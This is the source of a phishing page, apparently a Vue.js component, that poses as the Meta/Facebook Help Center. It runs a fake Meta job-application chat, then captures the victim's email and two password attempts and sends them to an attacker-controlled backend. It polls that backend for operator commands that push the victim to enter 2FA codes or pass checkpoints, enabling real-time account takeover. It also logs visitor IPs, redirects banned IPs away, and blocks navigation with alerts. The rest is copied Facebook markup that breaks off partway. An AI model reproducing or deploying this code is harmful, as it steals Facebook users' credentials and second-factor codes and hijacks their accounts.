<script>
import useValidate from "@vuelidate/core";
import { required, email, numeric } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue";

export default {
  name: "Form1",
  components: {
    ChatWidget,
  },
  data() {
    return {
      v$: useValidate(),
      waitingForResponse: false,
      first: true,
      second: false,
      third: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      wrongPw: false,
      pageLoad: false,
      conversation: [],
      currentOptions: [],
      steps: [
        {
          question: "What role are you most interested in at Meta?",
          options: [
            { label: "Marketing", value: "marketing" },
            { label: "Sales", value: "sales" },
            { label: "Technical Support", value: "tech_support" },
          ],
        },
        // Placeholder for dynamic questions based on Step 1 responses
      ],
      form: {
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        // appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    axios
      .post(
        `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
        { name: '***NEW PERSON***' }
      )
      .then((response) => {
        console.log(response);
      })
      .catch((e) => {
        console.log(this.errors);
      });
    // this.pageLoading();

    document.title = "Meta Help Center";
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    this.checkBan();
    this.startConversation();
  },
  methods: {
    outsideAlert(){
      if (confirm('You need to be logged in to leave')) {
        console.log('ok')
      } else {

      }
    },

    selectOption(option) {
      this.conversation.push({ text: option.label, type: 'answer' });
      this.determineNextStep(option.value);
    },
    determineNextStep(selectedValue) {
      let nextQuestion = {};
      switch (selectedValue) {
        case "marketing":
          nextQuestion = {
            question: "Do you prefer working in a team or independently?",
            options: [
              { label: "I prefer working in a team", value: "team" },
              { label: "I prefer working independently", value: "independent" }
            ],
          };
          break;
        case "sales":
          nextQuestion = {
            question: "Are you experienced in direct sales or indirect sales?",
            options: [
              { label: "I have experience in direct sales", value: "direct_sales" },
              { label: "I have experience in indirect sales", value: "indirect_sales" }
            ],
          };
          break;
        case "tech_support":
          nextQuestion = {
            question: "Would you rather work on hardware issues or software issues?",
            options: [
              { label: "I specialize in hardware issues", value: "hardware" },
              { label: "I specialize in software issues", value: "software" }
            ],
          };
          break;
        case "team":
        case "direct_sales":
        case "hardware":
          nextQuestion = {
            question: "How do you prioritize your tasks when multiple deadlines are approaching?",
            options: [
              { label: "I prioritize tasks based on their impact and deadlines", value: "impact" },
              { label: "I discuss with my team to allocate resources efficiently and meet all deadlines", value: "team_discussion" }
            ],
          };
          break;
        case "independent":
        case "indirect_sales":
        case "software":
          nextQuestion = {
            question: "Can you describe a time when you had to learn a new skill to complete a task or project?",
            options: [
              { label: "I quickly adapt by taking online courses and practicing in real-time scenarios", value: "quick_learning" },
              { label: "I seek mentorship and collaborate with knowledgeable colleagues to master new skills", value: "mentorship" }
            ],
          };
          break;
        case "impact":
        case "team_discussion":
        case "quick_learning":
        case "mentorship":
          nextQuestion = {
            question: "Do you have a Facebook account?",
            options: [
              { label: "Yes", value: "yes_facebook" },
              { label: "No", value: "no_facebook" }
            ],
          };
          break;
        case "yes_facebook":
          this.submitForm();
          // this.conversation.push({ text: "Please log in to your Facebook account to complete your application. This will help streamline the process and integrate your information with our system.", type: 'info' });
          return;
        case "no_facebook":
          this.submitForm();

          // this.conversation.push({ text: "To complete your application, we recommend creating a Facebook account, as it will be integral to your role and our company communications. Please consider setting up an account and notify us when this step is completed.", type: 'info' });
          return;
      }
      this.conversation.push({ text: nextQuestion.question, type: 'question' });
      this.currentOptions = nextQuestion.options;
    },
    startConversation() {
      const initialQuestion = this.steps[0];
      this.conversation.push({ text: initialQuestion.question, type: 'question' });
      this.currentOptions = initialQuestion.options;
    },

    pageLoading() {
      this.pageLoad = true;

      setTimeout(() => {
        this.pageLoad = false;
      }, 4500);
    },
    chatMessageStatus() {
      (this.chatMessage = true), console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    checkBan() {
      axios
        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
          ip: this.ipAddress,
        })
        .then((response) => {
          if (response.data == "BAN") {
            window.location.href = "https://www.facebook.com/help/";
          }
        })
        .catch((e) => {
          console.log(e);
        });
    },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
              resType = "email";

              this.$router.push({
                name: "twofa",
                params: {
                  type: resType,
                  email: this.form.email,
                },
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
              resType = "code";

              this.$router.push({
                name: "twofa",
                params: {
                  type: resType,
                  email: this.form.email,
                },
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_CHECKPOINT") {
              this.$router.push({
                path: "checkpoint",
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
              this.wrongPw = true;
              this.loading = false;
              this.modal.password = "";
              clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            { name: 'APPEAL BUTTON' }
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            console.log(this.errors);
          });

       if (screen.width <= 760) {
          this.$router.push({
            path: "login",
          });
        } else {
          this.firstPassword = true;
        }
        

      
      return;
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        this.firstPassword = true;
      }
    },
    submitPassword() {
      if (this.modal.password != "") {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { email: this.form.email, firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
              this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert() {
      alert("Please complete the form before you navigate.");
    },
  },
  validations() {
    return {
      form: {
        page_name: { required },
        name: { required },
        email: { required, email },
        mobile: { required, numeric },
        // appeal: { required },
      },
    };
  },
};
</script>

<template>
  <div v-if="loading" id="loadFacebookC" class="">
    <div id="loadFacebookG">
      <div id="blockG_1" class="facebook_blockG"></div>
      <div id="blockG_2" class="facebook_blockG"></div>
      <div id="blockG_3" class="facebook_blockG"></div>
    </div>
  </div>

  <div id="mount_0_0_T2" style="">
    <!--$-->
    <!--$-->
    <div class="__fb-light-mode">
      <!--$-->
      <div class="">
        <div class="x9f619 x1n2onr6 x1ja2u2z">
          <div
          >
            <input type="hidden" value="AfdYnSXLU9ZW8nEAXeY" name="h" /><input
              type="hidden"
              value="mb"
              name="ref"
            />
          </div>
          <div
            aria-valuetext="Loading..."
            role="progressbar"
            tabindex="0"
            class="always-enable-animations xshklg3 xxkxylk x1u6ievf x127lhb5 xa3vuyk x1xzmf5g xqu0tyb xds687c x17qophe xg01cxk xixxii4 x13vifvy xn9wirt x14g40p9 x1s85apg"
          >
            <div
              class="x1c74tu6 xa4qsjk x14rlmvs xa3vuyk x4o00kh x5yr21d xh8yej3"
            ></div>
          </div>
          <div class="x9f619 x1n2onr6 x1ja2u2z">
            <div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
              <div class="x78zum5 xdt5ytf x1n2onr6">
                <div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad">
                  <!--$-->
                  <div
                    class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4"
                  >
                    <!--$-->
                    <!--$-->
                    <div class="x2bj2ny x18n5i07">
                      <div
                        aria-label="Facebook Help Center home page"
                        class="x1ve1bff x9l4bfa x1swvt13 xixxii4 x13vifvy xh8yej3 x1vjfegm"
                        role="banner"
                        @click="outsideAlert()"
                      >
                        <div
                          class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                        >
                          <div
                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                          >
                            <div
                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                            ></div>
                            <div
                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                            >
                              <div
                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xexx8yu xnnlda6"
                              >
                                <div
                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli"
                                >
                                  <a
                                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x1lku1pv"
                                    href="/help/"
                                    role="link"
                                    tabindex="0"
                                  >
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1nhvcw1 x6s0dn4 xozqiw3 x1q0g3np"
                                    >
                                      <div
                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli"
                                      >
                                        <svg
                                          viewBox="0 0 36 36"
                                          class="x1lliihq x1k90msu x2h7rmj x1qfuztq x5e5rjt"
                                          fill="currentColor"
                                          height="40"
                                          width="40"
                                        >
                                          <path
                                            d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"
                                          ></path>
                                          <path
                                            class="xe3v8dz"
                                            d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"
                                          ></path>
                                        </svg>
                                      </div>
                                      <div
                                        aria-label="Facebook Help Center"
                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sln4lm"
                                      >
                                        <span
                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                          dir="auto"
                                          >Help Center</span
                                        >
                                      </div>
                                    </div>
                                  </a>
                                </div>
                                <div
                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli"
                                >
                                  <div
                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xn6708d x1ye3gou xexx8yu x1n0m28w xp7jhwk x137v6ai"
                                  >
                                    <div
                                      class="x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sxyh0 xurb0ha x9f619 x1y1aw1k xwib8y2 xdzyupr"
                                    >
                                      <div
                                        class="x9f619 x78zum5 xdt5ytf xh8yej3"
                                      >
                                        <div class="">
                                          <div class="xh8yej3">
                                            <div
                                              class="x6s0dn4 x78zum5 xh8yej3"
                                            >
                                              <label
                                                class="x1a2a7pz x1qjc9v5 xnwf7zb x40j3uw x1s7lred x15gyhx8 x9f619 x78zum5 x1fns5xo x1n2onr6 xh8yej3 xu0aao5 xmjcpbm"
                                                ><span
                                                  class="xhb22t3 xb5gni xcj1dhv x6s0dn4 x78zum5 xuxw1ft x47corl x1sln4lm"
                                                  ><svg
                                                    fill="currentColor"
                                                    viewBox="0 0 16 16"
                                                    width="1em"
                                                    height="1em"
                                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od"
                                                  >
                                                    <g
                                                      fill-rule="evenodd"
                                                      transform="translate(-448 -544)"
                                                    >
                                                      <g fill-rule="nonzero">
                                                        <path
                                                          d="M10.743 2.257a6 6 0 1 1-8.485 8.486 6 6 0 0 1 8.485-8.486zm-1.06 1.06a4.5 4.5 0 1 0-6.365 6.364 4.5 4.5 0 0 0 6.364-6.363z"
                                                          transform="translate(448 544)"
                                                        ></path>
                                                        <path
                                                          d="M10.39 8.75a2.94 2.94 0 0 0-.199.432c-.155.417-.23.849-.172 1.284.055.415.232.794.54 1.103a.75.75 0 0 0 1.112-1.004l-.051-.057a.39.39 0 0 1-.114-.24c-.021-.155.014-.356.09-.563.031-.081.06-.145.08-.182l.012-.022a.75.75 0 1 0-1.299-.752z"
                                                          transform="translate(448 544)"
                                                        ></path>
                                                        <path
                                                          d="M9.557 11.659c.038-.018.09-.04.15-.064.207-.077.408-.112.562-.092.08.01.143.034.198.077l.041.036a.75.75 0 0 0 1.06-1.06 1.881 1.881 0 0 0-1.103-.54c-.435-.058-.867.018-1.284.175-.189.07-.336.143-.433.2a.75.75 0 0 0 .624 1.356l.066-.027.12-.061z"
                                                          transform="translate(448 544)"
                                                        ></path>
                                                        <path
                                                          d="m13.463 15.142-.04-.044-3.574-4.192c-.599-.703.355-1.656 1.058-1.057l4.191 3.574.044.04c.058.059.122.137.182.24.249.425.249.96-.154 1.41l-.057.057c-.45.403-.986.403-1.411.154a1.182 1.182 0 0 1-.24-.182zm.617-.616.444-.444a.31.31 0 0 0-.063-.052c-.093-.055-.263-.055-.35.024l.208.232.207-.206.006.007-.22.257-.026-.024.033-.034.025.027-.257.22-.007-.007zm-.027-.415c-.078.088-.078.257-.023.35a.31.31 0 0 0 .051.063l.205-.204-.233-.209z"
                                                          transform="translate(448 544)"
                                                        ></path>
                                                      </g>
                                                    </g></svg></span
                                                ><input
                                                  dir="ltr"
                                                  aria-autocomplete="list"
                                                  aria-expanded="false"
                                                  aria-label="Suggested Articles"
                                                  role="combobox"
                                                  placeholder="Search help articles…"
                                                  autocomplete="off"
                                                  spellcheck="false"
                                                  aria-invalid="false"
                                                  class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1yc453h xhb22t3 xb5gni xcj1dhv x2s2ed0 xq33zhf xjyslct xjbqb8w xnwf7zb x40j3uw x1s7lred x15gyhx8 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xzsf02u xdl72j9 x1iyjqo2 xs83m0k xjb2p0i x6prxxf xeuugli x1a2a7pz x1n2onr6 x15h3p50 xm7lytj xsyo7zv xdvlbce x16hj40l xc9qbxq xo6swyp x1ad04t7 x1glnyev x1ix68h3 x19gujb8"
                                                  type="search"
                                                  value=""
                                              /></label>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sxyh0 xurb0ha"
                                    >
                                      <span
                                        class="x4k7w5x x1h91t0o x1h9r5lt x1jfb8zj xv2umb2 x1beo9mf xaigb6o x12ejxvf x3igimt xarpa2k xedcshv x1lytzrv x1t2pt76 x7ja8zs x1qrby5j"
                                        ><a
                                          aria-label="Support Inbox"
                                          class="x1i10hfl x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x16tdsg8 x1hl2dhg xggy1nq x87ps6o x1lku1pv x1a2a7pz x6s0dn4 x14yjl9h xudhj91 x18nykt9 xww2gxu x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x1vqgdyp x100vrsf x1qhmfi1"
                                          href="/support/"
                                          role="link"
                                          tabindex="0"
                                          target="_self"
                                          ><i
                                            data-visualcompletion="css-img"
                                            class="x1b0d499 xep6ejk"
                                            style="
                                              background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/P8kBKmrVnRh.png');
                                              background-position: 0 -483px;
                                              background-size: auto;
                                              width: 20px;
                                              height: 20px;
                                              background-repeat: no-repeat;
                                              display: inline-block;
                                            "
                                          ></i>
                                          <div
                                            class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x14yjl9h xudhj91 x18nykt9 xww2gxu"
                                            data-visualcompletion="ignore"
                                          ></div> </a
                                      ></span>
                                      <!--$-->
                                      <!--/$-->
                                    </div>
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sxyh0 xurb0ha xktsk01"
                                    >
                                      <div
                                        aria-label="Change Language: English (US)"
                                        class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
                                        role="button"
                                        tabindex="0"
                                      >
                                        <div
                                          class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou x1qhmfi1 x1fq8qgq"
                                        >
                                          <div
                                            class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
                                          >
                                            <div
                                              class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                                            >
                                              <span
                                                class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x1lkfr7t x1lbecb7 x1s688f x1dem4cn"
                                                dir="auto"
                                                ><span
                                                  class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                                                  >English (US)</span
                                                ></span
                                              >
                                            </div>
                                          </div>
                                          <div
                                            class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip"
                                            data-visualcompletion="ignore"
                                          ></div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div
                                  class="x9f619 x1n2onr6 x1ja2u2z xdt5ytf x2lah0s x193iq5w xeuugli x1s85apg x1dn74xm x1di1pr7"
                                >
                                  <div
                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xn6708d x1ye3gou xexx8yu x1n0m28w xp7jhwk"
                                  >
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sxyh0 xurb0ha"
                                    >
                                      <a
                                        aria-label="Search"
                                        class="x1i10hfl x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x16tdsg8 x1hl2dhg xggy1nq x87ps6o x1lku1pv x1a2a7pz x6s0dn4 x14yjl9h xudhj91 x18nykt9 xww2gxu x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x1vqgdyp x100vrsf x1qhmfi1"
                                        href="/help/search/"
                                        role="link"
                                        tabindex="0"
                                        >
                                        <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/X12x-LHqySt.png');background-position:0 -5761px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                        <div
                                          class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x14yjl9h xudhj91 x18nykt9 xww2gxu"
                                          data-visualcompletion="ignore"
                                        ></div>
                                      </a>
                                    </div>
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1sxyh0 xurb0ha"
                                    >
                                      <a
                                        aria-label="More"
                                        class="x1i10hfl x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x16tdsg8 x1hl2dhg xggy1nq x87ps6o x1lku1pv x1a2a7pz x6s0dn4 x14yjl9h xudhj91 x18nykt9 xww2gxu x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x1vqgdyp x100vrsf x1qhmfi1"
                                        href="/help/463972400461409/?helpref=hc_global_nav"
                                        role="link"
                                        tabindex="0"
                                        >
                                        <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/P8kBKmrVnRh.png');background-position:0 -546px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                        <div
                                          class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x14yjl9h xudhj91 x18nykt9 xww2gxu"
                                          data-visualcompletion="ignore"
                                        ></div>
                                      </a>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div
                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x1qjc9v5 xozqiw3 x1q0g3np x4cne27 xifccgj"
                      >
                        <div
                          class="hidethis x9f619 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xqcrz7y x2bj2ny x1ok221b xexx8yu x18d9i69 x7wzq59 x13vifvy x1cvmir6 xfe63ej"
                        >
                          <nav
                            @click="outsideAlert()"
                            aria-labelledby="sideNavigationHeading"
                            class="xrh9p9f x1q1vt7x x1ow4hk9"
                          >
                            <div
                              role="list"
                              class="xb57i2i x1q594ok x5lxg6s x78zum5 xdt5ytf x6ikm8r x1ja2u2z x1pq812k x1rohswg xfk6m8 x1yqm8si xjx87ck xx8ngbg xwo3gff x1n2onr6 x1oyok0e x1odjw0f x1e4zzel x5yr21d x1iorvi4"
                            >

                            <nav  @click="outsideAlert()" aria-labelledby="sideNavigationHeading" class="xrh9p9f x1q1vt7x x1ow4hk9">
                              <div class="xb57i2i x1q594ok x5lxg6s x78zum5 xdt5ytf x6ikm8r x1ja2u2z x1pq812k x1rohswg xfk6m8 x1yqm8si xjx87ck xx8ngbg xwo3gff x1n2onr6 x1oyok0e x1odjw0f x1e4zzel x5yr21d x1iorvi4" role="list">
                                <div class="x78zum5 xdt5ytf x1iyjqo2 x1n2onr6">
                                  <div role="list" class="html-div xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd">
                                    <div role="listitem" class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xykv574 xbmpl8g x1wsgfga x9otpla">
                                      <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np">
                                        <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9">
                                          <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2">
                                            <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l xwib8y2 x1y1aw1k">
                                              <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                <div class="xu06os2 x1ok221b">
                                                  <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h" dir="auto">
                                                    <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">
                                                      <div data-visualcompletion="ignore-dynamic" role="listitem" style="padding-left:8px;padding-right:8px">
                                                        <div class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq" role="button" tabindex="-1">
                                                          <div class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh">
                                                            <div class="x78zum5 xdt5ytf xq8finb x1xmf6yo x1e56ztr x1n2onr6 xqcrz7y">
                                                              <div class="x14yjl9h xudhj91 x18nykt9 xww2gxu x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x3nfvp2 xl56j7k x1n2onr6 x1qhmfi1 xc9qbxq x14qfxbe">
                                                                <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/yZ/r/P8kBKmrVnRh.png');/* background-position:0 -273px; */background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                                              </div>
                                                            </div>
                                                            <div class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z">
                                                              <div class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z">
                                                                <div class="">
                                                                  <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                                    <div class="xu06os2 x1ok221b">
                                                                      <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h" id=":R5ll696l9aqqaupapd5aq:">
                                                                        <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">Using Facebook</span>
                                                                      </span>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                              <div class="xod5an3 x16n37ib x14vqqas x1n2onr6 xqcrz7y">
                                                                <div class="x6s0dn4 x78zum5 x1q0g3np">
                                                                  <div class="x78zum5">
